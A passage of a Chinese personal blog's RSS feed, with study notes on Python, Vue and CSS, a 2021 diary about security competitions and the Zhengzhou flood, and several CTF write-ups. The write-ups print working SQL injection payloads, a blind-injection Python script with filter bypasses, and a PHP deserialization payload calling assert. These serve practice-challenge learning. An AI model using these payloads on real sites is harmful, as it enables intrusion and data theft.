可以使用global关键字来指示局部函数中的变量来自全局变量，nonlocal关键字表示变量来自外部嵌套函数内的变量&#xA;事实上，减少对全局变量的使用，也是降低代码之间耦合度的一个重要举措，同时也是对迪米特法则的践行。&#xA;字符串和常用数据结构 字符串 反斜杠\用来转义。 \后面可以跟八进制和六进制来表示字符，\u68d2使用unicode字符编码表示字符。 如果不想使用\转义，可以在字符串前加上字母r说明&#xA;s1 = r&amp;#39;\n\\hello, world!\\\n&amp;#39; print(s1) # \n\\hello, world!\\\n 使用+进行字符串拼接，使用*重复一个字符串的内容，in、not in来判断字符串中是否包含子串，[]、[:]用来切片运算。&#xA;字符串类型是一种结构化的、非标量类型，所以会有一系列的属性和方法。 字符串对象身上的常用的函数：&#xA;len()；获取字符串长度 capitalize()；字符串首个字母大写的拷贝 title()；每个字符串单词首字母大写的拷贝 upper()；所有字符串大写的拷贝 find()；查找字串位置。未找到值为 -1 startswith()；以某字符开始。类似的有endswith() center(50,&amp;rsquo;*&amp;rsquo;)；将字符串以指定宽度居中，填充指定字符。类似的有rjust()、ljust() isdigit()；是否为数字构成 isalpha()；是否为字母构成 isalnum()；是否为数字字母构成 strip()；获取处理左右两侧空格后的拷贝 格式化输出字符串 使用%d、%s等占位符，并在字符串结尾使用%()列表对应。 字符串提供的format()方法。 Python 3.</description>
    </item>
    <item>
      <title>博客图床迁移</title>
      <link>/posts/play_time/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E5%BA%8A%E8%BF%81%E7%A7%BB/</link>
      <pubDate>Sun, 01 May 2022 00:00:00 +0000</pubDate>
      <guid>/posts/play_time/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E5%BA%8A%E8%BF%81%E7%A7%BB/</guid>
      <description>起因 原来博客的图片使用Jsdelivr和github的方式存储访问，但是最近Jsdelivr频繁的被墙，感觉可能在未来的不久会失效，毕竟好多人用来当免费的CDN（比如我），也会有人使用其访问些zz敏感或其他的文件，被墙了也情有可原，而且github的仓库的作用也是用来存储代码而非图床，像我这样的人也导致了仓库的滥用，所以决定找个新的途径。&#xA;过程 当时在网上找了好久，最后在loc上找到了 一个帖子，感觉把目前行得通的方法都列出来了。&#xA;一、第三方存储&#xA;github+jsdelivr 或 gitee 可以搭配PicGo使用 茎肛互撸娃大佬的鸡霸图床 国内对象存储 使用Onedrive 或 Google Drive 搭建图床 二、自行搭建&#xA;（腾讯云轻量香港 or CDN） 反代 （本地 or 大盘鸡） 北岸域名+国内机器 国内机器非标准端口 家宽开通公网IP存在家里 三、直接嵌在文档中，图片转base64，markdown插入&#xA;最后我是选择了良心云的cos对象存储，新用户第一年便宜，就算以后续费一年差不多也70左右。之前自己有了解过对象存储这一技术，但是当时听闻的是有人被套路云的流量计费给掏空了，这次在良心云的计费方式中找到了按量计费，这也刚好满足了博客图片也不多的需求，更不怕被人把钱包给刷爆了。&#xA;上传的方式还是配合PicGo上传，又添加了一个rename-file插件实现上传路径的命名。因为感觉对象存储给的链接太长，国内没有备案的域名，使用了一个服务器直接域名重定向到对象存储给的域名。&#xA;结果 宣布从这篇文章开始往后的图片都会用对象存储，之前的文章如果有需要评论或者联系我再补上吧。&#xA;插曲（避坑） 期间使用对象存储测试图片的时候，发现过一阵子图片就访问不了了，去桶里一看发现空空如也，发生了两次清空也不知道啥原因，最后一次点了下清空存储桶，发现使用方式里有个生命周期管理，发现是这玩意自动删除文件，所以记得把生命周期规则修改一下。</description>
    </item>
    <item>
      <title>Vue学习笔记</title>
      <link>/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</link>
      <pubDate>Mon, 07 Mar 2022 18:16:47 +0800</pubDate>
      <guid>/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</guid>
      <description>理解MVVM Vue参考的MVVM模型&#xA;M：模型(Model) ：data中的数据 V：视图(View) ：模板代码 VM：视图模型(ViewModel)：Vue实例 观察发现：&#xA;data中所有的属性，最后都出现在了vm身上。 vm身上所有的属性及Vue原型上所有属性，在Vue模板中都可以直接使用。 数据代理 回顾Object.defineProperty方法 let number = 18 object.defineProperty(person,&amp;#39;age&amp;#39;,{ value:18, enumerable:true，//控制属性是否可以枚举，默认值是false writable:true，//控制属性是否可以被修改，默认值是false configurable:true //控制属性是否可以被删除，默认值是false //当有人读取person的age属性时，get函数（getter)就会被调用，且返回值就是age的值 get(){ return number }, //当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值 set(value){ number = value } }) 数据代理 何为数据代理？通过一个对象来修改另一个对象。&#xA;例如，obj={x:100}&#xA;obj2={y:200}&#xA;使用Object.defineProperty方法，设置obj2的x属性get和set方法与obj绑定&#xA;Object.defineProperty(obj2,&amp;#39;x&amp;#39;,{ get(){ return obj.x }, set(value){ obj.x = value } }) 在script标签里设置的data属性值，绑定的是vm中的_data属性&#xA;Vue中的数据代理： 通过vm对象来代理data对象中属性的操作（读/写） Vue中数据代理的好处： 更加方便的操作data中的数据 基本原理： 通过0bject.defineProperty()把data对象中所有属性添加到vm上。为每一个添加到vm上的属性，都指定一个getter/setter。在getter/setter内部去操作（读/写）data中对应的属性。&#xA;事件处理 事件的基本使用：&#xA;使用v-on:xxx 或 @xxx 绑定事件，其中xxx是事件名； 事件的回调需要配置在methods对象中，最终会在vm上； methods中配置的函数，不要用箭头函数！否则this就不是vm了； methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象； @click=&amp;ldquo;demo&amp;rdquo; 和 @click=&amp;ldquo;demo($event)&amp;ldquo;效果一致，但后者可以传参； @click=&amp;ldquo;yyy&amp;rdquo;，其中yyy可以写一些简单的语句 事件修饰符 使用示例</description>
    </item>
    <item>
      <title>CSS学习</title>
      <link>/posts/css%E5%AD%A6%E4%B9%A0/</link>
      <pubDate>Tue, 15 Feb 2022 09:28:06 +0800</pubDate>
      <guid>/posts/css%E5%AD%A6%E4%B9%A0/</guid>
      <description>选择器 element p 选择所有 &amp;lt;p&amp;gt; 元素。 element.class p.intro 选择 class=&amp;ldquo;intro&amp;rdquo; 的所有 &amp;lt;p&amp;gt; 元素。 element,element div, p 选择所有 &amp;lt;div&amp;gt; 元素和所有 &amp;lt;p&amp;gt; 元素。 element element div p 选择 &amp;lt;div&amp;gt; 元素内的所有 &amp;lt;p&amp;gt; 元素。 element&amp;gt;element div &amp;gt; p 选择父元素是 &amp;lt;div&amp;gt; 的所有 &amp;lt;p&amp;gt; 元素。 element+element div + p 选择紧跟 &amp;lt;div&amp;gt; 元素的首个 &amp;lt;p&amp;gt; 元素。 element1~element2 p ~ ul 选择前面有 &amp;lt;p&amp;gt; 元素的每个 &amp;lt;ul&amp;gt; 元素。 选择器的权重 选择器权重（从上往下优先级变低）：&#xA;内联样式&#xA;id选择器&#xA;类和伪类选择器&#xA;元素选择器&#xA;通配选择器&#xA;继承优先级（没有优先级）&#xA;比较优先级时，需要将所有选择器的优先级相加计算，最后优先级越高的优先显示（分组选择器是单独计算的）&#xA;div#box (相加计算) div,p,span&#x9;(单独计算) 如果优先级计算后相同，则根据代码最后设置的样式显示。</description>
    </item>
    <item>
      <title>2021年度总结</title>
      <link>/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</link>
      <pubDate>Mon, 07 Feb 2022 11:04:02 +0800</pubDate>
      <guid>/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</guid>
      <description>已经二月才写年度总结的估计只有我把，纯纯的懒狗一条。&#xA;个人总结 学业 因为加入了学校组织的DROPS集训队，整个人都把精力投入在里面了，然后把自己学习的笔记和经验总结起来写在博客里，有种丰收的喜悦。和集训队的队友们每周会有分享会，然后还去参加了几次大型的比赛，让我知道天外有天人外有人，经常把自己缩在自己的小圈子里，再厉害也就仅限于自己的小圈子。&#xA;下半年的考研，觉得自己努力了，但是又觉得没有努力，还是目标不够明确吧，考研的目标一降再降，最后觉得要个文凭都差不多了，和其他的大佬比起来，自己辣鸡也不是没有原因的，志向都不一样，但是又想成为厉害的人。如果考研不成功的话就打算去就业。&#xA;目前的程度也就是在github上找一些项目自己部署到服务器，看着项目的文档自己进行一些配置，感觉距离开发越走越远了，偶尔会找一找项目的代码自己DIY点，确实也挺迷茫的，学又学不进去，之前的学校教的也忘得差不多了，感觉还是考研后和行业脱节了，将来要后追起来。&#xA;感情 网上认识了一个网友，一起聊了很久最后算是开始了一段网恋吧，但是感觉自己经验还是很少，并且有点喜欢没有拘束的感觉，经常打游戏忘了她，觉得挺内疚的。之前的我也算是个一毛不拔的人，然后开始慢慢的会给她准备一些小礼物，和她在一起也确实让我变得开朗些，不光是和她在一起的时候，和其他的朋友心灵上的交流也变多了，和她在一起也当我打开了心扉吧。&#xA;学会用github 现在才知道github上的项目真的是人类智慧的结晶，在上面找了好多有趣的项目，目前自己部署的有两个网盘、青龙面板(懂的都懂)、自己的跳板机一堆，想整点什么小工具就可以在上面找到有一样想法的人，然后借鉴一下人家的代码是如何实现的。看一些高分的项目，大概知道了些目前的项目都实现了啥样牛逼的功能，还有一些模块功能的项目，多看些这种，如果将来自己项目开发遇到一样的功能就可能有很大的帮助。&#xA;思考 写博客真的是个记录自己成长的过程的好东西，以后坚持。&#xA;走出自己的舒适圈，去看看外面的世界有多大，才知道目前的实力根本不够支撑自己的梦想。&#xA;不管遇到什么样的困难，只要觉得目前的路是对的，硬着头皮顶下去，事情总会发生一些转变。&#xA;希望能坚持一个目标一直走下去吧。&#xA;*保持你的决心❤️</description>
    </item>
    <item>
      <title>2021年度日记</title>
      <link>/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%97%A5%E8%AE%B0/</link>
      <pubDate>Thu, 03 Feb 2022 09:47:43 +0800</pubDate>
      <guid>/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%97%A5%E8%AE%B0/</guid>
      <description>新年快乐🤗 年度总结被拖到了农历的年。。。确实是自己懒得离谱（确实懒嗷，这篇文章写了四天了）。年前想写但是又想迁移博客，所以没干，年后家里又置办年货要搭把手，现在咣里咣当就到初二了，属实过太快了。&#xA;本来打算写年度总结，但是觉得太长了就改成年度日记吧。我看着手机相册，想起来什么写什么吧。（多图警告⚠️⚠️⚠️）&#xA;1-2月 回家祭祖的时候遇到了两只大鹅，憨憨的看着我&#xA;真的是人生第一次吃必胜客的披萨，因为是个宅所以出校门的机会都不多。(真心觉得必胜客的披萨也就一般般)&#xA;在小黑盒上抽奖，中了一个鼠标垫，人生第二次网络上中奖，最重要的还是隔了半个月连中。&#xA;第一次中奖是B站的一个up名字叫大果粒粒，一周一更的搞笑视频，属于是生活必需品了，周指活。中了50块红包😋&#xA;3-5月 三月份吧，去学校就是被封在里面，好像一直到6月份放暑假都在学校，只有周日可以出去一天，我们学校还是一个单独一个学院在市中心，地方也不大真能憋死人。打听我发小的学校，通知说的到学校需要14天隔离，但是到学校第二天就睁一只眼闭一只眼，随便出门了，岂可修。&#xA;现在疫情还没放开，去学校的话估计还是要封校，我和室友们都讨论过这话题，我们上了大学四年因为疫情姑且在学校封了半年，我们下面的2019级，到学校也就出门过半年，现在都封校到大三了，更惨的是2020级新生，从进学校就被封在里面，现在已经大二了，这感觉真的是换了个地方上高中。&#xA;我们学校上面的领导也是脑子不好使，整个学校除了学生，其他任何人都可以随便出入，包括我们学校被当做停车场这件事，只要你给钱，我们学校车随便停，所以也有了学生开着车把人带出去，这件事更离谱，学工办的老师都把监控调出来了，清清楚楚看见车牌，没有去车管所找这辆车车主是谁，反而在学校的班长群里问车里出来的人谁认识。学校还有各种事真听得脑壳疼。&#xA;继续流水账。&#xA;宿舍某次出门聚餐吃了烤羊腿，这个腿啊，真的是一言难尽，我们宿舍6个人带个蹭饭的同学7个人，这个羊腿的套餐没份都不够，比如只有4-5个，让我们分的很不舒服，并且这个腿吃着完全没有味道！好多地方嚼不动。已经被我标记了&#xA;今年更得番《奇蛋物语》感觉太棒了，剧情讲的很完美，每个女生都有自己的伤口，也都有自己战斗的理由。很多角色身上的弱点性格，在自己身边和自己身上都有见过，只是当时的自己也没有深入思考过如何面对，看这部番也给了一个自己思考的机会。总之就是看完以后然我也觉得充满了力量。&#xA;我姐在她楼下的蛋糕店办了个卡，办卡送了一个蛋糕但是我姐一个人吃不完，刚好我和爸妈一起去我姐那，就把蛋糕领回家吃了。🐭🐭我啊，最喜欢吃甜甜的蛋糕了&#xA;我姐特别想养小狗，让我舅帮忙找了一只崽回家，看这睡得狗仰马翻，还有一张闻着我臭jio睡的就不发了。再多的就不说了。&#xA;在宿舍基本上就是一星期总要喝一桶可乐，后来觉得不养生室友就一起买那种临期奶，又便宜又能换换口味，当时我们宿舍和室友的女朋友的宿舍，一起合买了17箱奶，后来还是一两个星期都干差不多了。冰山一角↓&#xA;对面宿舍买了个包子玩具，说是解压玩儿的，这我不好说了。我和一个室友看上了，也在网上买了两个&#xA;我找到了一张照片，是我早上爬起来发现嘴边有点痒，用照相机一拍，原来是蚊子在我嘴上叮了一口，我淦&#xA;2021年4月18日，Steam上的《绣湖:旅馆》白给了，可惜已经买了被小刺。&#xA;给我爸换了新手机红米K40。&#xA;我姐NS到了，让我盯着游戏打折买游戏，当时买了健身环、动森。后来打折还买了塞尔达、分手厨房、奥德赛。&#xA;大概5月份成了预备党员。&#xA;指环王重映了，这估计是我姐在高中那会看的，想再看一遍但又找不到人，就叫上我一起，我顺便蹭我姐饭/大笑。那阵子指环王是一周上一一部，一共三部曲看了三个星期。&#xA;6月 在宿舍楼里看到外面风景很棒，就随手拍了&#xA;还有一天，外面狂风大作，感觉吹得风打的雷劈的闪电都能把楼给拆了，但是那天却可以在宿舍里暖暖和和的打游戏，头一次在宿舍感觉到了家的感觉😂（过了几天还有一件大事，只我知道，标下日期2021.6.4）&#xA;在我姐那，刚好举着手机拍外面，发现了一个自由的气球上天了&#xA;在我姐那玩的健身环，这游戏雀食好啊，雀食好&#xA;人生第一次出去打比赛去河大打的，大佬说比赛是非常非常非常非常非常非常水的比赛，我们组只拿了三等奖，不过算是体验一把了，下面这个颁奖仪式还有个视频被传网上很火，B站视频找不到了，贴个相关的新闻里面有视频。主要还是体验一把学校报销费用打比赛。&#xA;今天在学校还学成了点外卖，一个星期就要去吃一次汉堡，主要还是学校食堂太小，一进里面就根本想不出哪家的饭还能吃下，越想越想直接扭头回宿舍。为此我还在闲鱼上买了个饿了吗年卡，30块，有点膈应的就是会找你要验证码，在卖家哪登陆，这么便宜主要还是把淘宝上的88会员给拆开卖了，我还买过一年的网易云黑胶40多。&#xA;这是半个榴莲，我同学的表弟给他送过去吃，他带回宿舍室友都不吃，臭味多少有点冲，吃不完就给我了，我和我一个室友知道这榴莲可是大补，两个人一会儿怼了一半😋&#xA;下半年打的全国大学生信息安全竞赛，本来我觉得自己刚加集训队菜的离谱，大佬们还是带着我组了四人队，先是线上赛打了两天，集训队的两个队伍进分赛区了，接下来去的武汉华科大打的，看了看人家学校真的是慕的直流口水，人家这学校才叫大学。分赛区的举办方在有点远的地方包了酒店，原价380一晚的房间选手只用100多还是200多我忘了，反正那个酒店是我目前住过最豪华的（反正自己也没住过多少酒店就是了），大大的落地窗还有小冰柜，冰柜里面还有可乐雪碧，太爽咯！早上自助餐也挺丰盛。&#xA;选手就位&#xA;最后成绩是打了分赛区的第二名一等奖，有了总决赛资格，分赛区第一名是三巨头实在打不过。打完比赛回学校集训队老师还发了新闻到学校官网，人生第一次上学校官网新闻。&#xA;同学空间整活，直呼太艺术了&#xA;7月 最奇妙的一个月&#xA;在家里屋顶上拍的好风景&#xA;接下来就是去哈工大打总决赛，是第二次坐飞机，第一次坐飞机是和我姐去贝加尔湖。专门挑的挨窗户的位置，但是这个窗户有划痕拍的不好看&#xA;飞机餐没啥看的就不放了，还有一张拍了很小很小很小的月亮&#xA;哈尔滨站&#xA;刚到的第一个酒店进去就一股霉味，然后整个房间都是那种很阴森的感觉，我们四个人都觉的不太舒服就换了个。&#xA;第一次去哈工大&#xA;晚上也不知道怎么吃饭，就几个人一起出去吃了铁锅炖大鹅，听了好久了终于吃上一次正宗的。&#xA;然后就是比赛的内容了。&#xA;总结这次比赛就是我们被爆锤，对比赛的重点没有把握好，第一天CTF算是比较正常的题，就是每个队伍的题是抽的，有的队伍抽的简单题就小不公平，然后就是加了一个叫可信计算的题目，大伙基本上都是第一次听说，比赛让我负责的这块我摸索了半天也没啥头绪，不过其他队伍也没解出多少。（最后比赛完听有的队伍说，有一道题的git仓库没有删掉，可以利用分支回溯原来的代码，太艹了）&#xA;第二天是被吊起来打的一天，我们队经验最多的总共也就参加过2-3次AWD比赛，这次比赛还禁用了靶机一些指令导致防御方面失算了，不过主要原因也怪我，因为我是主要负责这个方面的，分赛区的时候用WatchBird太舒服了，导致这次比赛大意了还是想一招吃遍天，这次比赛注重的就是防御，因为靶机一轮如果被攻击就会直接扣100分，但是攻击一次其他队伍才2分，总共也就80多个队伍，算上防御完美的想要稳分数只有不被打。然后我们比赛还出现了最逆天的一幕，因为靶机宕机会扣分，比赛有一个队伍没人来按理说应该是最后一名，但是我们队因为一直被打，然后修的慌慌张张导致好几轮靶机宕机，我们是倒一！&#xA;这次总决赛属实是拉胯了，不过也真心地明白了自己是有多菜，之前分赛区的成绩很彩但也不好说。第一天打完老师就把我们叫到宾馆好好说了一顿，老师说他们也不容易向学校申请我们这次来的经费，然后拿个三等奖才刚好能把费用持平blablabla，还好总决赛不算太激烈，80个队伍79个都能拿到奖，最后我们也是拿了个三等奖末尾回家了。&#xA;比赛还有最吸引人的地方就是华为之夜，因为华为是举办方所以晚上有顿大餐，所以我们打进总决赛还有个目标就是华为之夜。&#xA;入场的时候会发一张奖券，然后主持人就在上面组织一场小游戏抽一波奖，大伙都在下面坐的急不可耐，一等奖是华为mate40 pro、二等奖是华为手表，剩下的都是些手环、摄像头、音响啥的不值钱。我们队伍最后是四个人三个三等奖，我拿了个手环，最最最最劲爆的消息就是：我们其中一位带队老师，中了一等奖！当时我们看到我们老师上台的时候人都傻了（因为老师去和其他学校搞关系了没和我们坐一起），更羡慕的是我们这位老师这次比赛其实带着自己老婆来哈尔滨玩一玩，然后美滋滋的抱着mate40 pro回家了，我们老师中了奖，我们也觉得不虚此行。赛后我们四个人就去打卡哈尔滨了。&#xA;去了中央大街&#xA;一直走到头江上的小酒吧，当时还驻场歌手在船上唱歌，我们就坐着听了好久吹了吹江边的风&#xA;然后就是回家的时候，我们和老师没有订同一班的飞机但是时间都差不多，我们订了第二天7月19号中午11点的飞机但是延误了，就赶快找下一班的飞机是晚上18点，那天晚上在候机厅等了好久，一起玩原神，也就是这次带了一个队友开始入坑原神。我华为之夜中的一个手环还落到酒店了，当时老师的飞机停机已经安排了住宿，就托老师帮我回酒店拿了下，结果我们的飞机也不停的延误延误，最后等到0点乘客在前台和服务员理论，安排了辆车把我们送到酒店（和老师是同一个的，第二天我就去找老师拿东西了）。&#xA;7·20特大暴雨 飞机通知第二天7月20号八点起飞，那天黑龙江天气特好也算是准时起飞了，就是落地跟上了郑州7·20特大暴雨的全程。&#xA;我们当时落郑州的时候，就在郑州上面的云层里震了好一会，大概也有半个小时都是在很厚的云层里飞，什么都看不见，要是没飞机导航估计都不知道去哪了。&#xA;我们落地那会算是赶上了好天气，仿佛就是让我们这一班飞机从天上下来一样，外面太阳露了一点雨下的很小。然后我们就坐着城郊线回市区，路上就感觉外面的天气不对劲，当时我记得4点都外面的天气就黑的离大谱，感觉像晚上7点左右的天气&#xA;我们最后都转了二号线，但是我姐住处在五号线上和二号线隔了一站需要换乘，我原来不打算换乘，直接走一站过去，但是当我出门的时候人都傻了，看远处公交一半轮胎已经都没了。&#xA;原来还有想淌水过去的想法，但是想着背着电脑就算了。又回去换乘了五号线坐到下一站，后来看了五号线被淹的视频就感到小害怕。下一站出站口就没有被淹这么厉害，但是我看周围也没有什么能存贮水的道牙什么的，纯流动的水都已经淹过我鞋底了。我跑了两家超市才买了东西会楼上，第一家因为断网了没办法收银。最最最难的一道坎就是房子在25+楼！！！&#xA;然后就是在那没水没电的三天两夜，每天只上下楼一次保存体力，外出的时候去超市买水买面包，我妈还在小区的群里给我买了个应急的充电宝续命，我用自己电脑反向充电，发现了个平板还有50多的点，玩了玩连连看保持理智。在满屋子跑着找信号给爸妈报状态，无聊的时候拿着吃的和小板凳坐到楼顶看下面十字路口堵车😶‍🌫️&#xA;最气的是啥，我在的这个小区没有电，但是隔壁的小区灯火辉煌，但凡有个电我都能打着单机无限续命。&#xA;离开前的当天，我打算去我姐单位找补给，路上看到了真的是经历天灾后的城市，有一点点电影上的那种感觉了。路边都是隧道捞出来的车，到处都是泥泞，我走了好久才找到了一辆能用的共享单车，那几天好像全部的共享单车都免费骑助力郑州恢复，但是网不好使。&#xA;天上的直升机&#xA;逝者安息。&#xA;后半年 基本上都是准备考研，等有时间再更。</description>
    </item>
    <item>
      <title>博客搬迁</title>
      <link>/posts/play_time/%E5%8D%9A%E5%AE%A2%E6%90%AC%E8%BF%81/</link>
      <pubDate>Mon, 31 Jan 2022 11:31:54 +0800</pubDate>
      <guid>/posts/play_time/%E5%8D%9A%E5%AE%A2%E6%90%AC%E8%BF%81/</guid>
      <description>大四开始写毕业设计了，在学的过程中想记一记笔记，但是之前的hexo博客没动很久了，就想着把博客搬迁下顺便起个头，激起一些学习的劲头。&#xA;为什么选择Hugo 因为静态的网站生成框架也没几个，搜索的时候也就hexo、hugo、jekyll。之前用的hexo确实很顺手，但是自己改网站，加功能的时候搞了好多依赖，感觉很臃肿，当时的博客文件夹带上依赖大概就有500+MB，现在换了hugo看下是90MB。&#xA;hugo还有一个特点就是生成网站的速度很快。这一点我没有截图作比较，但是明显的感觉hugo比hexo快好多。引用一片文章里的一句话：&#xA;根据相关博主提供的数据，他200篇左右的博文用Hexo 需要10分钟去生成静态网页，而Hugo 只需要10秒。&#xA;所以感觉要是长期写东西的话，选个好的框架也是个长远的选择。&#xA;hugo在github上的⭐也比hexo多。&#xA;不过在迁移的过程中，最大的感受就是：Hugo在国内的使用者不多。&#xA;网上想要找个合适的教程非常难，然后就是去官网啃英文的文档。而且hugo框架和hexo比起来完全的不一样，鄙人go还没接触过，主要还是自己菜。一开始选了coder这个主题，但是觉得还是对hugo本身的了解不够多，四处碰壁，最后选择了一个有国人维护的也是我现在在用的主题，就是DoIt，这个主题也是从上一代的主题迭代下来的，因为原来的那个已经很久没有维护了(可能觉得已经完工了)。这个主题的教程也很友好，摸完感觉我有点上手了。&#xA;博客的部署 之前使用hexo，在最后使用的时候发现了Travis CI - Test and Deploy with Confidence 持续集成这个好东西，每次在本地写完博客以后push到github的仓库，然后这个app会自动构建博客发布到github pages。&#xA;所以这次也是一样的选择，一个仓库用来放博客本体(顺便当一个备份)，使用持续集成发布到github pages和自己服务器里。不过这次学到的是github Actions。因为之前有用过一些自动签到的脚本，所以这个东西也略有了解，差不多就借一个生产环境干一些事情。具体的配置github的官方docs也写的比较清楚还有中文翻译，上手还看了一篇阮老师的博客GitHub Actions 入门教程。&#xA;发布到自己服务器上那块感觉处理的还不是很好，找了好几种方法：ftp上传、webhook，最后用了执行git clone的命令从github pages拉仓库。&#xA;所以最后的部署的流程就是：&#xA;本地push到github仓库&#x9;&amp;ndash;&amp;gt;&#x9;仓库Actions发布到github pages、服务器拉取page仓库。</description>
    </item>
    <item>
      <title>CISCN线上赛库存</title>
      <link>/posts/ctf/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/</link>
      <pubDate>Wed, 18 Aug 2021 17:21:24 +0000</pubDate>
      <guid>/posts/ctf/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/</guid>
      <description>easy_sql 在用户名处，尝试sql注入，加上单引号报错，测试闭合，随便添加几个符号在password的报错附近中注意到了是括号单引号闭合&#xA;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &amp;lsquo;1&amp;rsquo;) LIMIT 0,1&amp;rsquo; at line 1&#xA;过滤的字符有union，所以尝试报错注入，查询版本号。&#xA;admin&amp;#39;) and (extractvalue(1,concat(0x7e,(select version()),0x7e)))# 接下来想要通过information_schema库查字段，但是发现被过滤了，所以猜表名和字段名，尝试出了flag表和表中的一个字段id，但是在id字段中只查询出了一个值：1，使用sqlmap跑也没跑出来。&#xA;最后参考了网上的一篇文章：mysql 注入 information_schema_绕过IDS过滤information_schema继续注入，模仿文章构造payload&#xA;admin&amp;#39;) and (extractvalue(1,concat(0x7e,(select * from (select * from flag a join flag b USING (id))c),0x7e)))# 回显为：Duplicate column name &amp;rsquo;no&amp;rsquo;，一开始以为是报了个错，但是根据文章使用using继续把查到的no字段加上去，发现还有其他字段&#xA;Duplicate column name &amp;#39;28d9f90a-4120-4ee8-9079-4e7613699510&amp;#39; 直接得到一个假的flag，真的还在flag表中，查询flag表中的改字段，报错注入长度有限制，所以加个substr一段一段截就出来了&#xA;admin&amp;#39;) and (extractvalue(1,concat(0x7e,substr((select `28d9f90a-4120-4ee8-9079-4e7613699510` from `flag`),1,30),0x7e)))# flag：CISCN{SWAqt-siWro-Wi7jV-FTdRm-9iOkG-}</description>
    </item>
    <item>
      <title>ReadlezPHP&amp;EasySearch</title>
      <link>/posts/ctf/readlezphpeasysearch/</link>
      <pubDate>Tue, 20 Apr 2021 17:12:43 +0000</pubDate>
      <guid>/posts/ctf/readlezphpeasysearch/</guid>
      <description>ReadlezPHP 源码找到time.php?source&#xA;&amp;lt;?php #error_reporting(0); class HelloPhp { public $a; public $b; public function __construct(){ $this-&amp;gt;a = &amp;#34;Y-m-d h:i:s&amp;#34;; $this-&amp;gt;b = &amp;#34;date&amp;#34;; } public function __destruct(){ $a = $this-&amp;gt;a; $b = $this-&amp;gt;b; echo $b($a); } } $c = new HelloPhp; if(isset($_GET[&amp;#39;source&amp;#39;])) { highlight_file(__FILE__); die(0); } @$ppp = unserialize($_GET[&amp;#34;data&amp;#34;]); 分析一波：最后一行一个反序列化，所以很明显是反序列化的题目，在HelloPhp中有一个__destruct方法，会在创建的对象销毁时执行，注意里面有一个echo输出，最重要的是后面的函数调用 ，好像是在PHP7某个版本之后只是使用形如$a($b)格式进行函数调用，假如变量a为字符串var_dump，b是任意字符串，就相当于调用var_dump函数且参数为b。&#xA;所以构造反序列化，调用assert函数执行phpinfo。如果向assert() 函数传递字符串，它将会被 assert() 当做 PHP 代码来执行)：&#xA;&amp;lt;?php&#xD;class HelloPhp&#xD;{&#xD;public $a=&amp;#39;phpinfo()&amp;#39;;&#xD;public $b=&amp;#39;assert&amp;#39;;&#xD;}&#xD;$s=new HelloPhp();&#xD;echo serialize($s); POST请求&#xA;time.php?data=O:8:&amp;#34;HelloPhp&amp;#34;:2:{s:1:&amp;#34;a&amp;#34;;s:9:&amp;#34;phpinfo()&amp;#34;;s:1:&amp;#34;b&amp;#34;;s:6:&amp;#34;assert&amp;#34;;} 页面查找flag，在environment中找到flag</description>
    </item>
    <item>
      <title>极客大挑战 2019 FinalSQL</title>
      <link>/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019finalsql/</link>
      <pubDate>Sun, 18 Apr 2021 19:11:51 +0000</pubDate>
      <guid>/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019finalsql/</guid>
      <description>还是同一场比赛的界面&#xA;这次测试了下面的登陆框已经不能用了，无论怎么输入都是同一个回显：你可别被我逮住了，臭弟弟，测试上面的序号，注意此时的url中有?id=猜测是一个注入点，输入单引号一直报错，但是输入2-1时成功回显，判断是一个数字型注入，数字型注入最多遇到的就是结合盲注，接下来是测试盲注的过滤。&#xA;发现if、union、and等被过滤，在整个字符串中如果出现空格会被拦下，ord、ascii等转换字符没有被过滤，if被过滤可以使用strcmp函数等代替，空格可以使用括号绕过。&#xA;贴出来自己的脚本：&#xA;# codeing=utf-8 import requests import time url=&amp;#39;http://1e069783-5d06-4d70-af82-c457e0d11a52.node3.buuoj.cn/search.php?id=&amp;#39; result=&amp;#39;&amp;#39; for x in range(1, 100): high = 127 low = 32 mid = (low + high) // 2 while high&amp;gt;low: # sql=&amp;#34;(ORD(SUBSTR((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))=%d)&amp;#34;%(i,c) # sql = &amp;#34;(ORD(SUBSTR((select(group_concat(column_name))from(information_schema.columns)where(table_name=&amp;#39;F1naI1y&amp;#39;)),%d,1))&amp;gt;%d)&amp;#34; % (x, mid) sql = &amp;#34;(ORD(SUBSTR((select(group_concat(password))from(F1naI1y)where(id=9)),%d,1))&amp;gt;%d)&amp;#34; % (x, mid) time.sleep(0.1) reponse=requests.get(url+sql) if &amp;#34;Click&amp;#34; in reponse.text: low=mid+1 else: high = mid mid = (low+high)/2 result += chr(int(mid)) print(result) 我是直接使用了判断字符的返回值1或0作为id的参数，因为使用group_concat拼接时字符串有逗号,所以字符ascii需要至少从44开始。&#xA;下面是查询到的两个表F1naI1y 、Flaaaaag及结构&#xA;F1naI1y ====&amp;gt; id,username,password</description>
    </item>
    <item>
      <title>WUSTCTF2020 朴实无华</title>
      <link>/posts/ctf/wustctf2020%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/</link>
      <pubDate>Fri, 16 Apr 2021 15:33:32 +0000</pubDate>
      <guid>/posts/ctf/wustctf2020%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/</guid>
